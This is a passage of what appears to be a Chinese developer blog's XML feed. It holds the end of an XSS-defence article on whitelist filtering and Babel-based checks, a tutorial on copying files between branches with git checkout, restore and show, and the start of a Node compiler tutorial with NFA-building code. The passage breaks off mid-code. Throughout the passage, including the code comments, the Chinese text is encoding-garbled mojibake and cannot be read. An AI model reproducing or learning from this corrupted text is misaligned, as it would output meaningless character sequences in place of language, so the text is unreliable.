id="æœ€åçš„æœ€å">æœ€åçš„æœ€å</h2><p>éœ€è¦æ³¨æ„ï¼Œä»¥ä¸Šè¿™äº›é˜²å¾¡æªæ–½ä¸èƒ½è¯¦å°½æè¿°æ¯ä¸ªç»†èŠ‚å’ŒæŠµå¾¡æ‰€æœ‰ XSSæ”»å‡»æ–¹å¼ã€‚é’ˆå¯¹ XSSçš„æ”»é˜²æˆ˜æ²¡æœ‰ä¸€åŠ³æ°¸é€¸çš„é“¶å¼¹ï¼Œä¹Ÿæ²¡æœ‰å‚»ç“œå¼çš„è§£å†³æ–¹æ¡ˆã€‚åªæœ‰ä¸¥æ ¼éµç…§å®‰å…¨æœ€ä½³å®è·µæ¥å°½é‡é¿å…ï¼Œå¹¶æå‡å®‰å…¨é˜²èŒƒçš„æ„è¯†ï¼ŒåŠ å¼ºå®‰å…¨å®¡è®¡çš„å·¥ä½œã€‚</p><p>é’“é±¼æ”»å‡»ï¼š ä¸»è¦æ˜¯å‘ç”Ÿåœ¨æäº¤çš„ HTMlå†…å®¹çš„æ—¶å€™å¸¦æœ‰ä¸€äº›å…¶ä»–çš„åŸŸååœ°å€ï¼Œè¿™äº›åŸŸååœ°å€å­˜åœ¨é’“é±¼çš„é£é™©ã€‚ é˜²èŒƒæ–¹å¼é€šè¿‡ securitykit.surl æ–¹æ³•è¿›è¡Œæ ¡éªŒï¼Œè¯¥æ–¹æ³•å¯¹éç™½åå•çš„åœ°å€è¿›è¡Œå‰”é™¤ã€‚</p><p>XSSé˜²å¾¡æ–¹æ¡ˆæœ€å¥½æ˜¯åœ¨ç¼–è¯‘æ—¶åˆè¿è¡Œæ—¶æä¾›ç›¸å…³çš„é¢„é˜²æ–¹æ¡ˆï¼šç¼–è¯‘æ—¶é¢„é˜²å¼€å‘äººå‘˜å‡ºç°å­˜åœ¨å®‰å…¨æ¼æ´çš„ä»£ç ï¼›è¿è¡Œæ—¶å°½é‡ä¸ç›¸ä¿¡ç”¨æˆ·çš„ä»»ä½•è¾“å…¥</p><ul><li>è¿è¡Œæ—¶ï¼šæä¾›è¿è¡Œæ—¶è¿‡æ»¤APIï¼Œèƒ½å¤Ÿè¿‡æ»¤ä¸åœ¨ç™½åå•ä¸Šçš„æ ‡ç­¾ä»¥åŠå¸¸è§çš„ä¼ªåè®®å­—ç¬¦ä¸²ã€‚</li><li>ç¼–è¯‘æ—¶ï¼šæä¾› Babel æ’ä»¶è¿›è¡Œ AST é£é™©ç‚¹è¯†åˆ«ï¼Œåœ¨é£é™©ç‚¹ä¸­åŒ…è£¹è¿è¡Œæ—¶è¿‡æ»¤APIï¼Œèµ·åˆ°è‡ªåŠ¨é˜²å¾¡çš„èƒ½åŠ›ã€‚</li></ul><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« ï¼š</h2><p>https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</p>]]></content>
    
    
    <categories>
      
      <category>å‰ç«¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å‰ç«¯ï¼Œxxsï¼Œè·¨ç«™è„šæœ¬æ”»å‡»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git checkout å¦™ç”¨</title>
    <link href="/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/"/>
    <url>/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>å½“ä½ åœ¨ Gitä¸­å¤„ç†ä¸€ä¸ªä»“åº“æ—¶ï¼Œä½ å¯èƒ½éœ€è¦ä»å¦ä¸€ä¸ªåˆ†æ”¯ä¸­è·å–ï¼ˆcheckoutï¼‰ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼ŒGitæä¾›äº†è®¸å¤šå¯èƒ½çš„æ–¹æ³•æ¥å¿«é€Ÿå®Œæˆè¿™é¡¹ä»»åŠ¡ã€‚å…¶ä¸­ä¸€ä¸ªæœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨gitcheckoutå‘½ä»¤ï¼Œå°†æŒ‡å®šçš„æ–‡ä»¶ä½œä¸ºä¸€ä¸ªå‚æ•°ã€‚</p><p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†åˆ†æè¿™ä¸ªé—®é¢˜çš„ä¸åŒè§£å†³æ–¹æ¡ˆï¼Œå¹¶ä»‹ç»æ¯ä¸€ç§è§£å†³æ–¹æ¡ˆæ‰€éœ€è¦éµå¾ªçš„æµç¨‹ã€‚</p><p>è®©æˆ‘ä»¬å¼€å§‹å§ã€‚ğŸ˜</p><p>Git Checkout ç”¨ä¾‹ä½ æ­£åœ¨å¤„ç†ä¸€ä¸ªåä¸ºfeature/Açš„åˆ†æ”¯ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªåä¸ºutils.jsçš„æ–‡ä»¶ã€‚</p><p>ä½ æœ‰å¦ä¸€ä¸ªåä¸ºfeature/Bçš„åˆ†æ”¯ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªæ›´æ–°çš„utils.jsæ–‡ä»¶ã€‚</p><p>ä½ æƒ³ç­¾å‡ºè¯¥æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä»feature/Båˆ†æ”¯å¸¦åˆ°feature/Aåˆ†æ”¯ã€‚</p><p>ä¸‹é¢æ˜¯è¿™ä¸ªä»»åŠ¡çš„ä¸‰ç§å¯è¡Œçš„è§£å†³æ–¹æ¡ˆã€‚</p><p>è§£å†³æ–¹æ¡ˆ 1ï¼šä½¿ç”¨ git checkout å‘½ä»¤ gitcheckoutå‘½ä»¤æä¾›äº†ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ¥ä»å¦ä¸€ä¸ªåˆ†æ”¯è·å–æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚</p><p>ä»¥ä¸‹æ˜¯ä»å¦ä¸€ä¸ªåˆ†æ”¯è·å¾—ï¼ˆcheckoutï¼‰æ–‡ä»¶çš„è¯­æ³•ï¼š</p><p>git checkout <other-branch-name> -- path/to/your/folderä»¥ä¸‹æ˜¯è¦éµå¾ªçš„æµç¨‹ï¼š</p><ol type="1"><li>åˆ‡æ¢ï¼ˆcheckoutï¼‰åˆ°ä½ æƒ³å¤åˆ¶æ–‡ä»¶çš„é‚£ä¸ªåˆ†æ”¯ã€‚</li></ol><p>git checkout feature/A 2. ä½ åœ¨å½“å‰åˆ†æ”¯ä¸Šï¼Œå¤åˆ¶è¯¥æ–‡ä»¶ã€‚</p><p>git checkout feature/B -- utils.js 3. ä½¿ç”¨gitstatuså‘½ä»¤æ¥ç¡®ä¿æ–‡ä»¶å·²ç»è¢«å¤åˆ¶äº†ã€‚</p><ol start="4" type="1"><li>æäº¤å¹¶æ¨é€åˆ°è¿œç¨‹ã€‚</li></ol><p>åœ¨ä½¿ç”¨ checkout å‘½ä»¤æ—¶ï¼Œä½ ä¹Ÿå¯ä»¥å¾—åˆ°ï¼š</p><p>ä¸€ä¸ªæ¥è‡ªå¦ä¸€ä¸ªåˆ†æ”¯çš„æ–‡ä»¶å¤¹ã€‚ é€šè¿‡æŒ‡å®šæ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªæ–‡ä»¶å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œä½ å¯ä»¥ä» stash è·å¾—ä¸€ä¸ªæ–‡ä»¶/æ–‡ä»¶å¤¹ã€‚</p><p>è§£å†³æ–¹æ¡ˆ 2ï¼šä½¿ç”¨ git restore å‘½ä»¤ å¦ä¸€ä¸ªé€‰æ‹©æ˜¯ä½¿ç”¨git switchå‘½ä»¤å’Œgitrestoreå‘½ä»¤ã€‚</p><p>å¦‚æœä½ ä»æœªå¬è¯´è¿‡è¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œé‚£ä¹Ÿæ²¡å…³ç³»ã€‚å®ƒä»¬æ˜¯æ¯”è¾ƒæ–°çš„ã€‚Git åœ¨ 2019å¹´çš„ 2.23 ç‰ˆæœ¬ä¸­å¼•å…¥äº†å®ƒä»¬ã€‚</p><p>è¿™ä¸¤ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯å‡å°‘ä½¿ç”¨ git checkoutå‘½ä»¤ï¼Œä»¥ç®€åŒ–ç”¨æˆ·çš„å·¥ä½œã€‚</p><p>git restoreå‘½ä»¤å¯ä»¥æ¢å¤å·¥ä½œæ ‘ã€‚</p><p>git switchå‘½ä»¤åˆ‡æ¢åˆ†æ”¯ã€‚</p><p>ä¸‹é¢æ˜¯ä»å¦ä¸€ä¸ªåˆ†æ”¯è·å–æ–‡ä»¶çš„è¿‡ç¨‹ï¼š</p><ol type="1"><li>åˆ‡æ¢åˆ°ä½ æƒ³è·å–ï¼ˆcheckoutï¼‰æ–‡ä»¶çš„åˆ†æ”¯ã€‚</li></ol><p>git switch feature/A 2. ä»å¦ä¸€ä¸ªåˆ†æ”¯è·å–æ–‡ä»¶ã€‚</p><p>git restore --source feature/B -- utils.js 3. æäº¤å¹¶æ¨é€æ›´æ”¹ã€‚</p><p>è§£å†³æ–¹æ¡ˆ 3ï¼šä½¿ç”¨ git show å‘½ä»¤ æœ€åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨git showå‘½ä»¤ã€‚</p><p>ä»¥ä¸‹æ˜¯è¦éµå¾ªçš„æµç¨‹ï¼š</p><ol type="1"><li>åˆ‡æ¢åˆ°å·¥ä½œåˆ†æ”¯ã€‚</li></ol><p>git switch feature/A 2. ä»å¦ä¸€ä¸ªåˆ†æ”¯è·å–æ–‡ä»¶ã€‚</p><p>git show feature/B:path/utils.js &gt; path/utils.js 3.æäº¤å¹¶æ¨é€æ›´æ”¹ã€‚</p><p>æ³¨æ„: è¿™æ¬¡ä½ éœ€è¦æŒ‡å®šæ¥è‡ªä½ çš„ç›®å½•æ ¹çš„ç›¸å¯¹è·¯å¾„ã€‚</p><p>å°ç»“æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œä»å¦ä¸€ä¸ªåˆ†æ”¯è·å–ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸æ˜¯ä»€ä¹ˆåƒå‘å°„ç«ç®­é‚£æ ·å›°éš¾ã€‚</p><p>å½“æˆ‘åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­éœ€è¦è¿™æ ·åšæ—¶ï¼Œæˆ‘é€šå¸¸ä½¿ç”¨git checkoutå‘½ä»¤ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodeä»å¤´æ‰‹å†™ä¸€ä¸ªç®€å•ç¼–è¯‘å™¨</title>
    <link href="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    <url>/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2><p>ä½¿ç”¨è¯­è¨€ï¼šnodeæœ¬æ–‡æ¶‰åŠï¼šç¼–è¯‘å™¨çš„è¯æ³•åˆ†æï¼ŒæŠ½è±¡è¯­ä¹‰æ ‘ç”Ÿæˆï¼Œè¯­æ³•åˆ†æï¼Œä»£ç ç”Ÿæˆæœ¬æ–‡é‡ç‚¹å†…å®¹ï¼š</p><ol type="1"><li>å®ç°æ­£åˆ™è¡¨è¾¾å¼åˆ†æå™¨</li><li>å®ç°ç®€æ˜“ç‰ˆ Flex</li><li>å®ç° LR0 è¯­æ³•ï¼Œå¹¶ç®€å•ä»‹ç»å…¶ä»–è¯­æ³•(LL, LR1, SLR, LSPR)</li><li>å®ç°ç®€æ˜“ç‰ˆ Bison</li><li>å®ç°ç”Ÿæˆæ±‡ç¼–ä»£ç </li><li>å®ç°ç®€æ˜“ç¼–è¯‘å™¨åŠŸèƒ½ï¼Œæä¾›ç¼–è¯‘æ—¶æœŸç±»å‹æ£€æŸ¥å’Œæ¨æ–­ï¼Œæ”¯æŒåŠ å‡ä¹˜é™¤æ”¯æŒå‡½æ•°çš„é€’å½’è°ƒç”¨ï¼Œä»¥åŠ</li></ol><p>ä¼šåŒ…å«çš„ï¼š</p><ol type="1"><li>å®ç° nfaï¼Œä»¥åŠè”åˆ nfa =&gt; dfaï¼Œè¿›è¡Œè¯æ³•åˆ†æ</li><li>å®ç° dfaï¼Œè¿›è¡Œè¯­æ³•åˆ†æï¼Œå¹¶åŸºäºæ­¤æ„å»ºæŠ½è±¡è¯­æ³•æ ‘(AST)</li><li>åŸºäº ast è¿›è¡Œè¯­è¨€ä¹‰åˆ†æ(ç±»å‹æ£€æŸ¥ä»¥åŠæ˜¯å¦ç¬¦åˆè¯­è¨€è§„èŒƒ)</li><li>åŸºäº astç”Ÿæˆæ±‡ç¼–ä»£ç ï¼Œè™½ç„¶æœ¬æ–‡æ²¡æœ‰æ˜¾ç¤ºçš„ç»ˆä¸­é—´ä»£ç ç”Ÿæˆè¿‡ç¨‹ï¼Œä½†æ˜¯ä¹Ÿæœ‰ç±»ä¼¼çš„æ€æƒ³</li></ol><p>ä¸ä¼šåŒ…å«çš„ï¼šæœ¬è¯­è¨€æ¯”è¾ƒç®€å•ï¼Œä¸åŒ…å«å¤æ‚æ•°æ®ç»“æ„çš„æ”¯æŒï¼Œå¦‚æ•°ç»„å¯¹è±¡ç­‰å…¶ä»–åŠŸèƒ½ï¼›ä¸ä¼šæ¶‰åŠå¤æ‚çš„ç¼–è¯‘å™¨åç«¯çŸ¥è¯†ï¼šå¦‚åƒåœ¾å›æ”¶ï¼Œå¯„å­˜å™¨æŸ“è‰²ï¼Œæ•°æ®æµåˆ†æç­‰ç­‰</p><p>minic è¯­æ³•ï¼š</p><ol type="1"><li>è¿ç®—ç¬¦ï¼šæ”¯æŒ+-*/è¿ç®—ï¼Œä¸æ”¯æŒä¼˜å…ˆçº§(, )</li><li>ç±»å‹ï¼šæ”¯æŒè‡ªç„¶æ•°(int ç±»å‹)ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”å€¼ä»¥åŠ void</li><li>è¯­å¥ï¼šæ”¯æŒå‡½æ•°è°ƒç”¨ï¼ŒåµŒå¥—çš„ if-elseè¯­å¥ï¼ˆif-elseå¿…é¡»æˆå¯¹å‡ºç°ï¼Œå¦‚ä¸‹çš„è¯­æ³•æ˜¯ä¸å…è®¸çš„ï¼‰</li><li>å’Œ C ä¸€æ ·ï¼Œå¿…é¡»è¦æœ‰ main å‡½æ•°</li><li>å˜é‡å¿…é¡»å£°æ˜çš„æ—¶å€™åŒæ—¶èµ‹å€¼ï¼Œå¦‚ä¸‹çš„å£°æ˜æ˜¯ä¸å…è®¸çš„</li><li>å…è®¸å—çº§ä½œç”¨åŸŸ</li><li>å…è®¸è¿”å›å€¼æ˜¯æ¡ä»¶è¡¨è¾¾å¼ï¼Œè¿ç®—è¡¨è¾¾å¼</li><li>è¿ç®—ç¬¦å·¦å³ä¸¤ä¾§ä»…å¯ä»¥æ˜¯å˜é‡æˆ–æ˜¯æ•°å­—</li></ol><p>ç»“æœç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ä»‹ç»ï¼š</p><ol type="1"><li>parserï¼šåŒ…å«æ­£åˆ™è¡¨è¾¾å¼ç”Ÿæˆå’Œè¯æ³•tokenç”Ÿæˆ</li><li>semanticï¼šæ–‡æ³•æ¨å¯¼å¼è§£æå’ŒæŠ½è±¡è¯­ä¹‰æ ‘ç”Ÿæˆ</li><li>checkï¼šè¯­æ³•å’Œç±»å‹æ ¡éªŒ</li><li>genï¼šæ±‡ç¼–ä»£ç ç”Ÿæˆ</li></ol><h2 id="parser">parser</h2><p>åœ¨è¯æ³•åˆ†æé˜¶æ®µï¼Œè¾“å…¥æ˜¯å­—ç¬¦ä¸²ï¼Œè¾“å‡ºæ˜¯ tokenæµï¼Œä¸€å¼€å§‹è®¾è®¡è¾“å‡ºæ˜¯æšä¸¾å€¼çš„æ•°ç»„ï¼Œç±»ä¼¼è¿™æ ·:<code>[TYPE, ID, BRACE, ...]</code>ï¼Œä½†æ˜¯è¿™æ ·ä¼šæœ‰é—®é¢˜ï¼Œå› ä¸ºè¯ç´ å€¼æ²¡åŠæ³•ä¿ç•™ä¸‹æ¥ï¼Œæ‰€ä»¥åé¢æ”¹æˆäº†å¦‚ä¸‹è¾“å‡º:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>ï¼Œ(è¡Œå·ï¼Œç±»å‹,è¯ç´ å€¼)ä¸‰å…ƒç»„ å­¦åœ¨æ„å»ºè‡ªåŠ¨æœºè¿‡ç¨‹ä¸­ï¼Œè‡ªåŠ¨æœºæŠŠè¾“å…¥æµè½¬æˆtokenæµï¼Œæ¯”å¦‚å½“è¯æ³•åˆ†æå™¨è¯»å®Œ int çš„æ—¶å€™ï¼Œè¿™æ—¶å€™å°±ä¼šè¿”å›ä¸€ä¸ª TYPEtokenï¼Œä½†æ˜¯å¦‚æœæ˜¯ int1ï¼Œå°±åº”è¯¥è¿”å›ä¸€ä¸ª IDtokenï¼Œæ‰€ä»¥è¿™é‡Œæ¶‰åŠåˆ°è´ªå©ªè¯»å–ï¼Œå¦å¤–å¯¹äºåƒ ifè¿™ç§å…³é”®å­—ï¼Œå¦‚æœåŒæ—¶æ»¡è¶³å¤šç§ç»ˆç»“çŠ¶æ€ï¼Œåº”è¯¥æ¶‰åŠåˆ°ä¼˜å…ˆçº§ï¼Œè¿™é‡Œçš„ä¼˜å…ˆçº§æ¯”è¾ƒç®€å•ï¼Œç›´æ¥éå†ç»ˆæ€èŠ‚ç‚¹æ•°ç»„endStates(å¯ä»¥ç†è§£ä¸ºå¶å­èŠ‚ç‚¹)ï¼Œé‡åˆ°ç¬¬ä¸€ä¸ªç¬¦åˆçš„å³è¿”å›ï¼Œæ‰€ä»¥æ­£åˆ™çš„ä¼˜å…ˆçº§å’Œå‰åé¡ºåºæœ‰å…³ï¼›</p><p>é‚£ä¹ˆå¦‚ä½•æ„å»ºè‡ªåŠ¨æœºï¼Ÿæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ„å»ºä¸€ç³»åˆ—å•ä¸ªæ­£åˆ™è¡¨è¾¾å¼å•å…ƒnfaï¼Œç„¶åè”åˆæˆä¸€ä¸ªå¤§çš„nfaå•å…ƒï¼Œè¿™ä¸ªnfaå¯ä»¥è§£ææˆ‘ä»¬çš„ä¹‹å‰æ­£åˆ™å•å…ƒï¼Œå†å¾—åˆ°è”åˆnfaçš„é‚»æ¥çŸ©é˜µedgesï¼Œæœ€åæ ¹æ®edgesè½¬æˆdfaï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œéœ€è¦åæ˜ç¡®çš„æ˜¯ï¼Œæˆ‘ä»¬çš„è¯æ³•åˆ†æå™¨æ”¯æŒä»¥ä¸‹å‡ ä¸ªå•å…ƒï¼š +: a+, <em>:a</em>, è¿æ¥: abï¼Œ é€»è¾‘æˆ–: a|bï¼Œ å­—ç¬¦é›†: [a-z]æ”¯æŒå°‘éƒ¨åˆ†å­—ç¬¦è½¬ä¹‰ï¼Œå¦‚ï¼š,Â t, </p><p>å¦‚ä½•æŠŠæ­£åˆ™è¡¨è¾¾å¼æ„å»ºä¸ºnfaï¼šå¯¹äºæ¯ä¸€ä¸ªå•å…ƒæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆå¯¹åº”çš„èŠ‚ç‚¹ï¼Œä½†æ˜¯æœ‰äº›é—®é¢˜æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼šæˆ‘ä»¬çš„è¾“å…¥æ˜¯ä¸€ä¸ªä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ­£åˆ™è¡¨è¾¾å¼æœ¬èº«å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªä¸ªå•å…ƒï¼Œè€Œè¿™äº›å•å…ƒåˆå¯èƒ½æ˜¯å­—ç¬¦æˆ–è€…å…¶ä»–å•å…ƒå’Œæˆçš„ï¼Œå¦‚ï¼ša|b å°±æ˜¯ä¸€ä¸ªå•å…ƒï¼Œä½†æ˜¯å…¶ç»„æˆå°±æ˜¯ 2 ä¸ªå­—ç¬¦ [a-z]|aå°±æ˜¯ä¸€ä¸ªå…ƒå¤–åŠ ä¸€ä¸ªæ™®é€šå­—ç¬¦å¦å¤–å¯¹äºä¸­æ‹¬å·è¿™ç§è¿˜éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œæ€è·¯å¦‚ä¸‹ï¼šå³ä½¿æ˜¯å•ä¸ªå­—ç¬¦ä¹Ÿä¼šæŠ½è±¡æˆèŠ‚ç‚¹çš„æ¦‚å¿µï¼Œå¦å¤–åœ¨ç”Ÿæˆè‡ªåŠ¨æœºçš„è¿‡ç¨‹ä¸­ï¼Œç”±äºå­˜åœ¨[]ï¼Œ+ï¼Œ*ç­‰ç­‰è¿™æ ·çš„ä¿®é¥°ç¬¦å·ï¼Œè€ƒè™‘ä½¿ç”¨stackè¿›è¡Œå­˜å‚¨ï¼Œç±»æ¯”æ‹¬å·åŒ¹é…ç®—æ³•ã€‚(<code>lib =&gt; parser =&gt; nfa =&gt; flexå‡½æ•°</code>)</p><h3 id="æ„å»ºåŸºæœ¬æ­£åˆ™å•å…ƒ">æ„å»ºåŸºæœ¬æ­£åˆ™å•å…ƒ</h3><p>æˆ‘ä»¬å¯ä»¥æä¾›ç›¸åº”çš„å‡½æ•°ï¼Œæˆ‘ä»¬çš„è¯æ³•åˆ†æå™¨åŒ…å«ä»¥ä¸‹å‡ ç§åŸºæœ¬æ­£åˆ™å•å…ƒï¼š</p><ol type="1"><li>è¿æ¥è¿ç®—ç¬¦</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>: VertexNode, to: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-comment">// fromçš„å°¾å’Œtoçš„å¤´ç›¸äº’è¿æ¥,æ³¨æ„circle</span><br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(<span class="hljs-keyword">from</span>.<span class="hljs-property">index</span>); <span class="hljs-comment">// è·å–é‚»æ¥è¡¨</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">memo</span>: number[] = [];<br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span> &amp;&amp; !memo.<span class="hljs-title function_">includes</span>(cur.<span class="hljs-property">index</span>)) &#123;<br>    memo.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">index</span>);<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br><br>  graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<br>    to.<span class="hljs-property">index</span>,<br>    graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span><br>  );<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>æˆ–</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">or</span>(<span class="hljs-params">a: VertexNode, b: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(a.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, a.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">next</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(b.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, b.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeEnd, nodeEnd.<span class="hljs-property">index</span>);<br>  <span class="hljs-title function_">connect</span>(a, nodeEnd);<br>  <span class="hljs-title function_">connect</span>(b, nodeEnd);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>å­—ç¬¦é›†</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">characters</span>(<span class="hljs-params">chars: string[]</span>) &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>, chars);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(nodeEnd.<span class="hljs-property">index</span>, chars);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br><br>  <span class="hljs-keyword">const</span> pre = nodeStart.<span class="hljs-property">firstEdge</span>;<br>  nodeStart.<span class="hljs-property">firstEdge</span> = nodeEnd;<br>  nodeEnd.<span class="hljs-property">next</span> = pre;<br><br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*ä¿®é¥°ç¬¦</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mutipliy</span>(<span class="hljs-params">wrapped: VertexNode</span>): <span class="hljs-title 